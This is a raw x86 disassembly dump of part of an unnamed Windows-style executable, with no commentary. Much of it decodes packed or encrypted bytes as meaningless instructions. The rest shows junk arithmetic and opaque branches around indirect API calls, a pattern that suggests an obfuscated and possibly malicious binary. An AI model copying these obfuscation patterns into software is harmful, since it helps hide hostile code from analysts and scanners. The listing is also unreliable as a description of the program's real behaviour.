  401928:	dec    eax
  401929:	adc    BYTE PTR [ecx],0x76
  40192c:	push   DWORD PTR [eax-0x9]
  40192f:	es xchg edi,eax
  401931:	jecxz  0x401922
  401933:	mov    cl,bh
  401935:	sbb    ah,bh
  401937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401938:	popa   
  401939:	mov    ebp,0x5765d6ba
  40193e:	repnz sbb esp,DWORD PTR ds:0x7d6ffe03
  401945:	sbb    ah,BYTE PTR [eax-0x2b]
  401948:	xlat   BYTE PTR ds:[ebx]
  401949:	adc    al,0x3e
  40194b:	pop    esi
  40194c:	mov    bh,0x7a
  40194e:	sbb    al,0x4
  401950:	inc    esi
  401951:	gs xchg edi,eax
  401953:	mov    DWORD PTR [edi],ebx
  401955:	xchg   edi,eax
  401956:	adc    al,0x66
  401958:	inc    ecx
  401959:	jl     0x4019bd
  40195b:	jbe    0x401978
  40195d:	jmp    0x9ca28957
  401962:	push   ss
  401963:	in     eax,0x58
  401965:	and    ch,BYTE PTR [esi]
  401967:	xchg   ebx,eax
  401968:	and    eax,0xa5715dcc
  40196d:	dec    eax
  40196e:	mov    ah,BYTE PTR [esi+0x6d]
  401971:	call   0x28c3d1af
  401976:	pop    ebx
  401977:	inc    esi
  401978:	inc    ebx
  401979:	mov    DWORD PTR [edx-0x6],edx
  40197c:	add    al,0xf1
  40197e:	xchg   edx,eax
  40197f:	out    dx,eax
  401980:	xor    BYTE PTR [ecx+0xb2221af],ah
  401986:	mov    al,0x1e
  401988:	outs   dx,BYTE PTR ss:[esi]
  40198a:	pop    esi
  40198b:	std    
  40198c:	lods   eax,DWORD PTR ds:[esi]
  40198d:	loopne 0x4019ad
  40198f:	xchg   edi,eax
  401990:	and    esp,DWORD PTR [ebp+0x25]
  401993:	or     al,0xdc
  401995:	or     al,0x50
  401997:	mov    dh,0x11
  401999:	fisub  WORD PTR [ebp-0x2b]
  40199c:	jb     0x401981
  40199e:	xlat   BYTE PTR ds:[ebx]
  40199f:	lock push eax
  4019a1:	test   BYTE PTR [esi],dl
  4019a3:	stc    
  4019a4:	push   0xffffffe8
  4019a6:	(bad)  
  4019a9:	fild   DWORD PTR [eax+esi*1]
  4019ac:	xchg   esi,eax
  4019ad:	push   edx
  4019ae:	xchg   esi,eax
  4019af:	cli    
  4019b0:	push   ecx
  4019b1:	repz inc esp
  4019b3:	mov    DWORD PTR [edx+0x56],esi
  4019b6:	dec    ebx
  4019b8:	pop    ebp
  4019b9:	xor    al,0xd1
  4019bb:	es out 0x8b,al
  4019be:	arpl   sp,ax
  4019c0:	jmp    0x4019ae
  4019c2:	and    DWORD PTR [esi],esi
  4019c4:	pop    ebp
  4019c5:	pushf  
  4019c6:	dec    ecx
  4019c7:	sti    
  4019c8:	and    dl,BYTE PTR [ecx-0x37]
  4019cb:	int    0x1a
  4019cd:	retf   
  4019ce:	gs pop edx
  4019d0:	jne    0x401992
  4019d2:	cmp    eax,esp
  4019d4:	std    
  4019d5:	mov    bh,0x5e
  4019d7:	sar    DWORD PTR [ebp+0x47],cl
  4019da:	test   al,0xb1
  4019dc:	sahf   
  4019dd:	mov    bl,0xbc
  4019df:	int    0x74
  4019e1:	xchg   edx,eax
  4019e2:	out    dx,eax
  4019e3:	push   edx
  4019e4:	dec    ebx
  4019e5:	scas   al,BYTE PTR es:[edi]
  4019e6:	xchg   esp,eax
  4019e7:	inc    ebx
  4019e8:	aaa    
  4019e9:	push   0x2ae67e05
  4019ee:	ret    0x3c82
  4019f1:	pushf  
  4019f2:	cvtps2pd xmm1,QWORD PTR [ecx-0x4a]
  4019f6:	mov    al,ds:0xb952b711
  4019fb:	pop    esi
  4019fc:	jge    0x401a1e
  4019fe:	lods   eax,DWORD PTR ds:[esi]
  4019ff:	sbb    dh,ah
  401a01:	mov    ebp,0xf4a32649
  401a06:	dec    ecx
  401a07:	xlat   BYTE PTR ds:[ebx]
  401a08:	xchg   edi,eax
  401a09:	sub    bh,BYTE PTR [edi-0x73e7879d]
  401a0f:	sahf   
  401a10:	cmp    al,0xd7
  401a12:	and    BYTE PTR [esi],ch
  401a14:	mov    ch,0x79
  401a16:	stos   DWORD PTR es:[edi],eax
  401a17:	sti    
  401a18:	fmul   st(0),st
  401a1a:	ins    DWORD PTR es:[edi],dx
  401a1b:	pop    eax
  401a1c:	dec    esp
  401a1d:	mov    esi,0x3c13c3c1
  401a22:	fidivr DWORD PTR fs:0xf1fdc544
  401a29:	mov    ah,0x15
  401a2b:	xor    edx,ebp
  401a2d:	jae    0x511b839c
  401a33:	jnp    0x401a4b
  401a35:	xlat   BYTE PTR ds:[ebx]
  401a36:	push   ds
  401a37:	inc    bh
  401a39:	xchg   ecx,eax
  401a3a:	sub    eax,0x823a3bb6
  401a3f:	xor    esi,esi
  401a41:	stc    
  401a42:	cli    
  401a43:	mov    WORD PTR [ebp+0x1da282c1],?
  401a49:	out    dx,al
  401a4a:	out    0x8c,eax
  401a4c:	outs   dx,DWORD PTR ds:[esi]
  401a4d:	and    cl,BYTE PTR [eax-0x19]
  401a50:	xor    ecx,ebx
  401a52:	or     eax,DWORD PTR [ebp+0x10]
  401a55:	addr16 cli 
  401a57:	xchg   esp,eax
  401a58:	xor    eax,0xa5269bf
  401a5d:	xchg   edi,eax
  401a5e:	xchg   ecx,eax
  401a5f:	lock push ebp
  401a61:	in     eax,0x94
  401a63:	push   ebp
  401a64:	arpl   WORD PTR [ecx+ecx*2-0x7a],di
  401a68:	push   esi
  401a69:	sbb    edi,DWORD PTR [ecx+0x4a]
  401a6c:	retf   
  401a6d:	out    dx,al
  401a6e:	fisubr WORD PTR [edi+0xee2c600]
  401a74:	iret   
  401a75:	push   ds
  401a76:	nop
  401a77:	loop   0x401a24
  401a79:	jns    0x401a64
  401a7b:	dec    ecx
  401a7c:	inc    ebx
  401a7d:	mov    ds:0xe3dea3af,eax
  401a82:	cmp    cl,BYTE PTR [ebx-0x3a701522]
  401a88:	hlt    
  401a89:	ds js  0x401a62
  401a8c:	cld    
  401a8d:	mov    bl,0xda
  401a8f:	div    DWORD PTR [edx-0x46]
  401a92:	sbb    edx,esp
  401a94:	xor    ebx,DWORD PTR [edi+0x27]
  401a97:	pushf  
  401a98:	stos   DWORD PTR es:[edi],eax
  401a99:	adc    al,BYTE PTR [ebx+0x25]
  401a9c:	std    
  401a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a9e:	sub    BYTE PTR [eax],0x10
  401aa1:	mov    eax,0xc7bce188
  401aa6:	push   0xc7e6de59
  401aab:	inc    esp
  401aac:	cmc    
  401aad:	cmp    BYTE PTR ds:0x38d4ae83,ch
  401ab3:	les    eax,FWORD PTR [edx+0x797fe65e]
  401ab9:	push   ds
  401aba:	icebp  
  401abb:	aaa    
  401abc:	pop    ecx
  401abd:	xchg   ebp,eax
  401abe:	pop    ecx
  401abf:	sbb    BYTE PTR [edi+0x1a306d0],bl
  401ac5:	in     eax,0x3e
  401ac7:	cmc    
  401ac8:	mov    eax,0x2887972
  401acd:	ficomp WORD PTR [ebp+0x1f80bb9]
  401ad3:	in     eax,0x62
  401ad5:	lea    esp,[ebp-0x4c36e3f]
  401adb:	leave  
  401adc:	adc    DWORD PTR [ecx+0xf],eax
  401adf:	or     al,0xe
  401ae1:	icebp  
  401ae2:	test   al,0x1c
  401ae4:	ss into 
  401ae6:	lods   eax,DWORD PTR ds:[esi]
  401ae7:	pop    eax
  401ae8:	std    
  401ae9:	sbb    BYTE PTR [esi+0x3f],ch
  401aec:	jg     0x401b20
  401aee:	xor    DWORD PTR [edi+0x1],edi
  401af1:	inc    ebp
  401af2:	jecxz  0x401b39
  401af4:	ret    0xaf00
  401af7:	aas    
  401af8:	retf   0x660d
  401afb:	sar    DWORD PTR [ebx+ebx*2+0x31],0x59
  401b00:	jns    0x401ad9
  401b02:	sub    DWORD PTR [esi-0x5a],edx
  401b05:	dec    eax
  401b06:	pop    edx
  401b07:	repnz stc 
  401b09:	in     eax,0x61
  401b0b:	ins    DWORD PTR es:[edi],dx
  401b0c:	vorps  ymm3,ymm1,YMMWORD PTR [ebp-0x24]
  401b11:	dec    ebx
  401b12:	stos   DWORD PTR es:[edi],eax
  401b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b14:	popa   
  401b15:	out    dx,al
  401b16:	jne    0x401b6a
  401b18:	sub    BYTE PTR ds:0x649a9ac4,bl
  401b1e:	(bad)  
  401b1f:	cmp    BYTE PTR cs:[eax],al
  401b22:	adc    DWORD PTR [esi],ebx
  401b24:	fdiv   DWORD PTR [ebx+0x33]
  401b27:	ins    DWORD PTR es:[edi],dx
  401b28:	pop    edi
  401b29:	in     al,dx
  401b2a:	xchg   esp,eax
  401b2b:	mov    cl,0x94
  401b2d:	mov    dl,BYTE PTR [ebp-0x3f2f2fc3]
  401b33:	lock fs mov ah,0x44
  401b37:	or     al,0xb7
  401b39:	pop    edx
  401b3a:	aaa    
  401b3b:	test   DWORD PTR [edx],ebp
  401b3d:	inc    ecx
  401b3e:	je     0x401ad2
  401b40:	js     0x401b21
  401b42:	pop    eax
  401b43:	and    DWORD PTR [eax-0x58a66846],ebp
  401b49:	mov    esi,0x4c3a23c1
  401b4e:	jno    0x401b68
  401b50:	xor    ah,BYTE PTR [ebp+0x564fccc9]
  401b56:	pushf  
  401b57:	xchg   ch,ch
  401b59:	xor    al,0x62
  401b5b:	mov    eax,0x7739ed81
  401b60:	dec    edi
  401b61:	sbb    edi,DWORD PTR [eax-0x745325e3]
  401b67:	dec    ebp
  401b68:	sbb    BYTE PTR [ebx],dh
  401b6a:	adc    eax,0x428199
  401b6f:	mov    edx,DWORD PTR [ebp+0x1c]
  401b72:	xor    eax,edi
  401b74:	or     DWORD PTR ds:0x4282cd,0x4282b1
  401b7e:	xor    edx,edx
  401b80:	sub    DWORD PTR ds:0x42819d,0x43d9
  401b8a:	or     edx,eax
  401b8c:	sub    eax,DWORD PTR ds:0x428205
  401b92:	mov    DWORD PTR [ebp-0x3c],edx
  401b95:	and    DWORD PTR ds:0x428209,edi
  401b9b:	mov    DWORD PTR [ebp-0x70],0x2c55
  401ba2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ba9:	xor    eax,eax
  401bab:	or     eax,DWORD PTR ds:0x4281a5
  401bb1:	sbb    DWORD PTR ds:0x42820d,eax
  401bb7:	mov    DWORD PTR [ebp-0x70],0x78a6
  401bbe:	mov    DWORD PTR [ebp-0x6c],0x188
  401bc5:	dec    DWORD PTR ds:0x42819d
  401bcb:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401bd2:	cmp    DWORD PTR ds:0x428219,0x0
  401bd9:	mov    DWORD PTR ds:0x428195,0x2928
  401be3:	mov    DWORD PTR ds:0x42823d,edx
  401be9:	mov    DWORD PTR ds:0x428289,0x401d
  401bf3:	mov    DWORD PTR ds:0x4281fd,0x33da
  401bfd:	jmp    0x401c61
  401c02:	mov    eax,0x7f8b
  401c07:	cmp    DWORD PTR ds:0x428219,0x0
  401c0e:	je     0x401c33
  401c14:	push   0x42804a
  401c19:	call   DWORD PTR ds:0x428a50
  401c1f:	xor    DWORD PTR ds:0x428209,0x7378
  401c29:	mov    DWORD PTR ds:0x428221,0x1ac8
  401c33:	or     DWORD PTR ds:0x428229,0x428271
  401c3d:	sub    DWORD PTR ds:0x4282c5,0x56c6
  401c47:	and    DWORD PTR ds:0x42819d,0x42823d
  401c51:	mov    eax,ds:0x428279
  401c56:	sbb    eax,DWORD PTR ds:0x428191
  401c5c:	mov    ds:0x428279,eax
  401c61:	mov    DWORD PTR [ebp-0x6c],0x3219
  401c68:	cmp    DWORD PTR ds:0x428239,0x0
  401c6f:	mov    DWORD PTR ds:0x428241,0x155c
  401c79:	mov    DWORD PTR ds:0x42822d,edx
  401c7f:	mov    DWORD PTR ds:0x428285,0x6508
  401c89:	jmp    0x401cef
  401c8e:	mov    DWORD PTR ds:0x428215,edx
  401c94:	cmp    DWORD PTR ds:0x428239,0x0
  401c9b:	jg     0x401ccf
  401ca1:	push   0x428225
  401ca6:	push   0x2301
  401cab:	push   0x427fdd
  401cb0:	push   DWORD PTR [ebp-0x20]
  401cb3:	call   DWORD PTR ds:0x428a98
  401cb9:	sbb    DWORD PTR ds:0x428269,ebx
  401cbf:	sub    DWORD PTR ds:0x428241,0x52b2
  401cc9:	or     DWORD PTR ds:0x4282b1,ecx
  401ccf:	add    DWORD PTR ds:0x42826d,0x42821d
  401cd9:	sbb    DWORD PTR ds:0x4282d1,edx
  401cdf:	adc    DWORD PTR ds:0x428269,ebx
  401ce5:	xor    DWORD PTR ds:0x428241,0x428195
  401cef:	mov    DWORD PTR [ebp-0x70],0x231c
  401cf6:	cmp    DWORD PTR ds:0x428191,0x0
  401cfd:	mov    DWORD PTR ds:0x4282c1,edx
  401d03:	mov    DWORD PTR ds:0x42819d,0x24f7
  401d0d:	mov    DWORD PTR ds:0x428215,0x7174
  401d17:	mov    DWORD PTR ds:0x428205,0x2128
  401d21:	jmp    0x401d84
  401d26:	mov    eax,ds:0x4281a1
  401d2b:	mov    DWORD PTR ds:0x428211,0x474d
  401d35:	cmp    DWORD PTR ds:0x428191,0x0
  401d3c:	jge    0x401d60
  401d42:	push   DWORD PTR [ebp-0x10]
  401d45:	push   0x1200
  401d4a:	call   DWORD PTR ds:0x4289bc
  401d50:	sub    DWORD PTR ds:0x428219,0x401d
  401d5a:	adc    DWORD PTR ds:0x428285,ebx
  401d60:	or     DWORD PTR ds:0x4282cd,0x7c7c
  401d6a:	add    DWORD PTR ds:0x428269,0x4282b9
  401d74:	sub    DWORD PTR ds:0x428191,0x428229
  401d7e:	or     DWORD PTR ds:0x428191,edx
  401d84:	mov    DWORD PTR [ebp-0x6c],0x1337
  401d8b:	sub    DWORD PTR ds:0x4281a5,0x2b4e
  401d95:	mov    DWORD PTR [ebp-0x70],0x7593
  401d9c:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401da3:	mov    DWORD PTR [ebp-0x70],0x3b72
  401daa:	sub    DWORD PTR ds:0x428231,ecx
  401db0:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401db7:	or     eax,0x3526
  401dbc:	mov    DWORD PTR [ebp-0x68],0x1b45
  401dc3:	cmp    DWORD PTR ds:0x428215,0x0
  401dca:	not    DWORD PTR ds:0x428289
  401dd0:	mov    DWORD PTR ds:0x428205,0x4649
  401dda:	jmp    0x401e43
  401ddf:	movzx  eax,WORD PTR ds:0x428239
  401de6:	mov    DWORD PTR ds:0x4282c1,edx
  401dec:	cmp    DWORD PTR ds:0x428215,0x0
  401df3:	jbe    0x401e29
  401df9:	push   DWORD PTR [ebp-0x28]
  401dfc:	push   DWORD PTR [ebp-0x10]
  401dff:	push   DWORD PTR [ebp-0x1c]
  401e02:	push   DWORD PTR [ebp-0x28]
  401e05:	call   DWORD PTR ds:0x428a9c
  401e0b:	or     DWORD PTR ds:0x42821d,0x42819d
  401e15:	add    DWORD PTR ds:0x428285,0x4282b5
  401e1f:	or     DWORD PTR ds:0x42820d,0x2e85
  401e29:	sbb    DWORD PTR ds:0x42827d,edi
  401e2f:	add    DWORD PTR ds:0x4281a1,0x428211
  401e39:	adc    DWORD PTR ds:0x4282b5,0x4539
  401e43:	mov    DWORD PTR [ebp-0x64],0x767d
  401e4a:	dec    eax
  401e4b:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401e52:	sbb    eax,DWORD PTR ds:0x428269
  401e58:	mov    DWORD PTR [ebp-0x5c],0x0
  401e5f:	xor    eax,eax
  401e61:	add    eax,DWORD PTR ds:0x42824d
  401e67:	mov    eax,DWORD PTR [eax]
  401e69:	and    DWORD PTR ds:0x4281a9,eax
  401e6f:	mov    DWORD PTR [ebp-0x34],0x599d
  401e76:	sub    eax,0x76c0
  401e7b:	mov    DWORD PTR [ebp-0x2c],0x165d
  401e82:	mov    DWORD PTR [ebp-0x1c],0xc51
  401e89:	cmp    DWORD PTR ds:0x4282c5,0x0
  401e90:	mov    DWORD PTR ds:0x4282cd,edi
  401e96:	mov    DWORD PTR ds:0x428281,0xed2
  401ea0:	mov    DWORD PTR ds:0x4282c1,0x3b94
  401eaa:	jmp    0x401f18
  401eaf:	mov    DWORD PTR ds:0x4281ad,0x6b18
  401eb9:	mov    DWORD PTR ds:0x428201,edi
  401ebf:	cmp    DWORD PTR ds:0x4282c5,0x0
  401ec6:	jne    0x401ef4
  401ecc:	push   DWORD PTR [ebp-0x14]
  401ecf:	push   0x428281
  401ed4:	call   DWORD PTR ds:0x428a58
  401eda:	xor    DWORD PTR ds:0x428215,0x42821d
  401ee4:	sbb    DWORD PTR ds:0x4282c9,0x7a3a
  401eee:	and    DWORD PTR ds:0x428209,ecx
  401ef4:	or     DWORD PTR ds:0x4281ad,0x41c2
  401efe:	or     DWORD PTR ds:0x4282bd,0x4282b1
  401f08:	add    DWORD PTR ds:0x428239,ebx
  401f0e:	and    DWORD PTR ds:0x4282d1,0x74ca
  401f18:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f1f:	mov    DWORD PTR [ebp-0x44],0x1
  401f26:	cmp    DWORD PTR ds:0x42826d,0x0
  401f2d:	mov    DWORD PTR ds:0x428199,0x9d7
  401f37:	mov    DWORD PTR ds:0x428219,0x6854
  401f41:	jmp    0x401fa6
  401f46:	mov    DWORD PTR ds:0x4282c5,0x4f57
  401f50:	cmp    DWORD PTR ds:0x42826d,0x0
  401f57:	jbe    0x401f88
  401f5d:	push   DWORD PTR [ebp-0x28]
  401f60:	push   DWORD PTR [ebp-0x1c]
  401f63:	push   0x428059
  401f68:	push   0x428001
  401f6d:	push   0x5c3f
  401f72:	call   DWORD PTR ds:0x4289c0
  401f78:	add    DWORD PTR ds:0x42821d,0x428271
  401f82:	adc    DWORD PTR ds:0x428239,ecx
  401f88:	sbb    DWORD PTR ds:0x4282b5,0x428235
  401f92:	adc    DWORD PTR ds:0x428195,0x428275
  401f9c:	adc    DWORD PTR ds:0x42822d,0x1df8
  401fa6:	mov    DWORD PTR [ebp-0x44],0x42e8
  401fad:	cmp    DWORD PTR ds:0x42827d,0x0
  401fb4:	mov    DWORD PTR ds:0x4282b1,ecx
  401fba:	mov    DWORD PTR ds:0x428289,0x1dcc
  401fc4:	mov    DWORD PTR ds:0x428271,0x1ee1
  401fce:	jmp    0x40204c
  401fd3:	mov    DWORD PTR ds:0x428221,0x1f50
  401fdd:	cmp    DWORD PTR ds:0x42827d,0x0
  401fe4:	ja     0x40201b
  401fea:	push   DWORD PTR [ebp-0x18]
  401fed:	push   DWORD PTR [ebp-0x18]
  401ff0:	push   0x6bf7
  401ff5:	call   DWORD PTR ds:0x428aa0
  401ffb:	add    DWORD PTR ds:0x428279,ecx
  402001:	add    DWORD PTR ds:0x4281fd,edx
  402007:	sbb    DWORD PTR ds:0x428209,0x428229
  402011:	and    DWORD PTR ds:0x428271,0x4282c1
  40201b:	and    DWORD PTR ds:0x428191,0x4644
  402025:	and    DWORD PTR ds:0x4281a1,edx
  40202b:	and    DWORD PTR ds:0x4281a9,0x428285
  402035:	xor    DWORD PTR ds:0x428239,0x428229
  40203f:	movzx  eax,BYTE PTR ds:0x428201
  402046:	xor    DWORD PTR ds:0x4282b1,eax
  40204c:	mov    eax,DWORD PTR [ebp-0x60]
  40204f:	sub    DWORD PTR ds:0x4282c9,0x428275
  402059:	jmp    0x402303
  40205e:	inc    ebx
  40205f:	jb     0x402006
  402061:	mov    ebp,0xbc53bdb5
  402066:	pushf  
  402067:	pop    ss
  402068:	add    DWORD PTR [ecx-0x75],esi
  40206b:	push   esi
  40206c:	arpl   WORD PTR [ebp-0xb],ax
  40206f:	int    0xbb
  402071:	mov    ebx,0xbbbbbfd0
  402076:	fld    DWORD PTR ds:0x4cc9116c
  40207c:	ins    DWORD PTR es:[edi],dx
  40207d:	sbb    esp,ebp
  40207f:	retf   0x2c2d
  402082:	sbb    al,0x72
  402084:	mov    ecx,0x157aa1b2
  402089:	out    dx,al
  40208a:	int3   
  40208b:	push   esi
  40208c:	or     esi,DWORD PTR [ebx+0x26e7f193]
  402092:	inc    esp
  402093:	repnz or DWORD PTR [ecx],ebx
  402096:	push   edx
  402097:	dec    edx
  402098:	sbb    BYTE PTR [esi+0x4d7ebd12],0x8f
  40209f:	sar    DWORD PTR [esi*1-0xff1d82e],0xb
  4020a7:	inc    esp
  4020a8:	mov    eax,ebp
  4020aa:	fiadd  WORD PTR [edi+esi*4-0x347f8283]
  4020b1:	or     DWORD PTR ds:0x87082d22,0xffffffc0
  4020b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b9:	xchg   BYTE PTR [ebx],ch
  4020bb:	mov    eax,0xabc97dc4
  4020c0:	mov    al,ds:0x6590ca8
  4020c5:	and    esi,ebx
  4020c7:	repnz sti 
  4020c9:	sbb    al,0xda
  4020cb:	(bad)  
  4020cc:	(bad)  
  4020cd:	(bad)  
  4020ce:	inc    BYTE PTR [edx-0x68]
  4020d1:	pushf  
  4020d2:	in     eax,0x51
  4020d4:	or     eax,0xec04159d
  4020d9:	mov    ch,0xfc
  4020db:	pop    esi
  4020dc:	jp     0x40206d
  4020de:	xchg   esp,ebx
  4020e0:	mov    WORD PTR [edx],es
  4020e2:	xchg   ebp,eax
  4020e3:	push   ecx
  4020e4:	(bad)  
  4020e5:	(bad)
  4020ea:	test   DWORD PTR [eax+0x46],edx
  4020ed:	sub    BYTE PTR [edx],bh
  4020ef:	dec    ebp
  4020f0:	sbb    BYTE PTR [eax+0x255be53c],bl
  4020f6:	test   al,0x7b
  4020f8:	pop    edi
  4020f9:	jnp    0x40209d
  4020fb:	mov    bl,0x83
  4020fd:	(bad)  
  4020fe:	dec    edx
  4020ff:	pop    ds
  402100:	aas    
  402101:	lods   al,BYTE PTR ds:[esi]
  402102:	retf   0x8c37
  402105:	jns    0x4020cc
  402107:	jo     0x402130
  402109:	inc    esi
  40210a:	std    
  40210b:	mov    esi,DWORD PTR [eax+0x31]
  40210e:	call   0x2e9b4634
  402113:	dec    eax
  402114:	pop    esp
  402115:	rol    BYTE PTR [esi-0x47],1
  402118:	adc    edx,DWORD PTR [esi+0x32]
  40211b:	add    ah,bl
  40211d:	jmp    0x876f:0x559057b
  402124:	hlt    
  402125:	bound  eax,QWORD PTR [eax+ebx*4-0x74]
  402129:	pusha  
  40212a:	sub    eax,0xc9292b89
  40212f:	adc    ecx,edx
  402131:	cld    
  402132:	pop    edx
  402133:	add    al,0xd8
  402135:	pop    es
  402136:	mov    ebx,0x62ac345f
  40213b:	dec    ebp
  40213c:	popa   
  40213d:	dec    esp
  40213e:	mov    dh,0xdc
  402140:	xor    eax,0x5e8d5968
  402145:	sub    BYTE PTR [edi],ch
  402147:	xchg   DWORD PTR [ebx],eax
  402149:	push   ss
  40214a:	aam    0xec
  40214c:	clc    
  40214d:	xlat   BYTE PTR ds:[ebx]
  40214e:	cmp    al,0xb6
  402150:	pop    ebx
  402151:	repz xor BYTE PTR [ebp+0x30],0xbc
  402156:	ficomp DWORD PTR [eax]
  402158:	xlat   BYTE PTR ds:[ebx]
  402159:	sbb    DWORD PTR [ebx-0x32],esp
  40215c:	xor    DWORD PTR [ebx],eax
  40215e:	dec    ebp
  40215f:	or     ecx,ebp
  402161:	pop    ecx
  402162:	cwde   
  402163:	hlt    
  402164:	in     eax,dx
  402165:	das    
  402166:	aad    0x62
  402168:	repz jge 0x402133
  40216b:	mov    bl,0x4f
  40216d:	add    eax,0xc5500106
  402172:	fisubr WORD PTR [edx+0x13]
  402175:	bound  ebp,QWORD PTR [edx]
  402177:	hlt    
  402178:	mov    ds:0xf7a9e164,al
  40217d:	int    0x12
  40217f:	sar    DWORD PTR [edi+eax*4+0xf67b2dc],1
  402186:	jnp    0x40219c
  402188:	xchg   edi,eax
  402189:	push   esp
  40218a:	push   eax
  40218b:	xrelease mov DWORD PTR [ebp+0xf],ebp
  40218f:	inc    esp
  402190:	rcr    BYTE PTR ds:0x429c135b,0xea
  402197:	call   0xbfa2722c
  40219c:	push   ebx
  40219d:	lds    ebx,FWORD PTR [ebx+edi*4+0x27018b98]
  4021a4:	push   ebx
  4021a5:	test   eax,0xab1ae7a5
  4021aa:	dec    esi
  4021ab:	cdq    
  4021ac:	fisubr DWORD PTR ds:[ecx]
  4021af:	sbb    BYTE PTR ds:0xd64222ab,bl
  4021b5:	iret   
  4021b6:	push   0xdd56aca
  4021bb:	adc    eax,0xa59bbbbf
  4021c0:	jns    0x4021e2
  4021c2:	es repz and al,0xe3
  4021c6:	repz push es
  4021c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c9:	jne    0x40220c
  4021cb:	jge    0x40223c
  4021cd:	es sbb ebx,ecx
  4021d0:	jg     0x4021d9
  4021d2:	lds    ebp,FWORD PTR [ebp-0xdedbaee]
  4021d8:	nop
  4021d9:	(bad)  
  4021da:	jle    0x4021a7
  4021dc:	inc    edi
  4021dd:	xchg   ebp,eax
  4021de:	ror    DWORD PTR [ebx+0x59b0753f],0x6e
  4021e5:	xchg   ebp,eax
  4021e6:	mov    cl,0xe4
  4021e8:	or     cl,BYTE PTR [ebx]
  4021ea:	and    al,0x46
  4021ec:	les    esp,FWORD PTR [eax]
  4021ee:	iret   
  4021ef:	add    WORD PTR ds:0x4b1609fb,ax
  4021f6:	and    eax,DWORD PTR [ebp-0x54737f0c]
  4021fc:	xor    al,0xd7
  4021fe:	pop    esi
  4021ff:	add    edi,DWORD PTR [eax+0x5]
  402202:	gs clc 
  402204:	mov    edi,fs
  402206:	popf   
  402207:	repnz fld st(5)
  40220a:	xchg   edx,eax
  40220b:	xchg   dl,bl
  40220d:	push   ebx
  40220e:	fadd   DWORD PTR [esi]
  402210:	xor    DWORD PTR [ecx],ebx
  402212:	xchg   ecx,eax
  402213:	or     ecx,edx
  402215:	stos   DWORD PTR es:[edi],eax
  402216:	fistp  QWORD PTR [eiz*2+0x725ac9c5]
  40221d:	inc    edx
  40221e:	xor    al,BYTE PTR ds:0xc7c6ca44
  402224:	push   0x6d
  402226:	mov    dh,0x56
  402228:	mov    bh,BYTE PTR [edx+ebx*2-0x54]
  40222c:	xor    eax,0xc25e404d
  402231:	or     BYTE PTR ds:0xf5a54bba,bl
  402237:	jmp    0x402211
  402239:	cmp    BYTE PTR [edx-0x38],ch
  40223c:	jno    0x402288
  40223e:	add    di,sp
  402241:	sti    
  402242:	(bad)  
  402243:	push   ss
  402244:	ret    0xc85c
  402247:	(bad)  
  402248:	in     eax,0x1
  40224a:	xlat   BYTE PTR ds:[ebx]
  40224b:	xchg   esi,eax
  40224c:	(bad)  
  40224e:	add    BYTE PTR [ebp+0x1e3b768],ah
  402254:	mov    dh,0x73
  402256:	adc    edi,edi
  402258:	sbb    al,0x10
  40225a:	pop    edi
  40225b:	lock stc 
  40225d:	adc    eax,0xe88f5123
  402262:	pop    eax
  402263:	jle    0x40225b
  402265:	repnz mov dl,0x35
  402268:	popa   
  402269:	iret   
  40226a:	cmp    al,0x55
  40226c:	vmread DWORD PTR [edi+0x763948cd],edi
  402273:	outs   dx,BYTE PTR ds:[si]
  402275:	idiv   BYTE PTR [edi]
  402277:	cmp    DWORD PTR [ecx],0xffffffcd
  40227a:	std    
  40227b:	mov    ah,BYTE PTR [eax]
  40227d:	jo     0x402242
  40227f:	loopne 0x402221
  402281:	sub    al,0x3c
  402283:	pop    ecx
  402284:	call   0xc1638f6d
  402289:	jno    0x402290
  40228b:	call   0xf0cf:0x5db13a6d
  402292:	adc    eax,0x1a339c04
  402297:	pop    ss
  402298:	jmp    0x6354:0xa6d8ca8
  40229f:	lock stc 
  4022a1:	push   edi
  4022a2:	mov    DWORD PTR [edi],ebp
  4022a4:	sub    BYTE PTR [edi+0x516f5366],al
  4022aa:	sbb    ch,0xb8
  4022ad:	fidiv  WORD PTR [eax-0x4a]
  4022b0:	test   BYTE PTR [ebx-0x30c1127b],dl
  4022b6:	mov    al,ds:0x96a69d12
  4022bb:	clc    
  4022bc:	popa   
  4022bd:	xor    al,0xfc
  4022bf:	jmp    0xf648:0xcc4214d
  4022c6:	in     al,dx
  4022c7:	call   0x1fe05339
  4022cc:	inc    edx
  4022cd:	je     0x40225d
  4022cf:	ins    BYTE PTR es:[edi],dx
  4022d0:	pop    eax
  4022d1:	jne    0x4022f8
  4022d3:	iret   
  4022d4:	adc    eax,ebp
  4022d6:	cdq    
  4022d7:	xchg   ebx,eax
  4022d8:	xchg   edx,eax
  4022d9:	fsubrp st(7),st
  4022db:	loopne 0x40225e
  4022dd:	loopne 0x40231e
  4022df:	xchg   esi,eax
  4022e0:	popf   
  4022e1:	outs   dx,DWORD PTR ds:[esi]
  4022e2:	in     al,0x11
  4022e4:	lea    ebp,[eax+0x4b]
  4022e7:	or     DWORD PTR [eax*4+0x30a3182b],esp
  4022ee:	inc    edi
  4022ef:	(bad)  
  4022f0:	jno    0x402328
  4022f2:	xor    al,0xbb
  4022f4:	out    0x29,eax
  4022f6:	lods   eax,DWORD PTR ds:[esi]
  4022f7:	inc    esi
  4022f8:	or     dl,BYTE PTR [ebx]
  4022fa:	cmp    al,dl
  4022fc:	add    al,BYTE PTR [ebx-0x96fd3e7]
  402302:	add    ecx,0x8b491ee1
  402308:	dec    ebp
  402309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40230a:	push   ecx
  40230b:	push   eax
  40230c:	push   0xddf
  402311:	push   0x2d0f
  402316:	call   0x418100
  40231b:	xor    ecx,DWORD PTR ds:0x42820d
  402321:	mov    ecx,DWORD PTR [ebp-0x68]
  402324:	mov    edx,DWORD PTR [ebp-0x64]
  402327:	cmp    DWORD PTR ds:0x428195,0x0
  40232e:	mov    DWORD PTR ds:0x42827d,ecx
